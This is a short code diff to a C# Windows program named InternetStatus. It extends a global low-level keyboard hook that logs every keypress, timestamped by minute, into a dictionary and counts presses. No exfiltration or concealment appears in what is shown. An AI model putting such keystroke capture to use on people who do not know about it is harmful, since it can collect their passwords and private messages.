@@ -12,6 +12,10 @@ namespace InternetStatus
     {
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
+        private const int WM_KEYUP = 0x101;
+        private const int WM_SYSKEYDOWN = 0x104;
+        private const int WM_SYSKEYUP = 0x105;
+
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
 
@@ -33,7 +37,7 @@ namespace InternetStatus
             var now = DateTime.Now;
             var currentMinute = new DateTime(now.Year, now.Month, now.Day, now.Hour, now.Minute, 0);
             if (!KeyLogs.ContainsKey(currentMinute)) KeyLogs.Add(currentMinute, string.Empty);
-            KeyLogs[currentMinute] += $"[{keys}]";
+            KeyLogs[currentMinute] += $".{keys}.";
 
             MainForm.keyPressedCount++; 
         }
@@ -57,8 +61,14 @@ namespace InternetStatus
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
+                var key = (Keys)vkCode;
+
+                //KeyEventArgs kea = new KeyEventArgs(key);
+
                 //Console.WriteLine((Keys)vkCode);
-                AddKeyLog((Keys)vkCode);
+                AddKeyLog(key);
+
+                //if (kea.Handled) return 1;
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
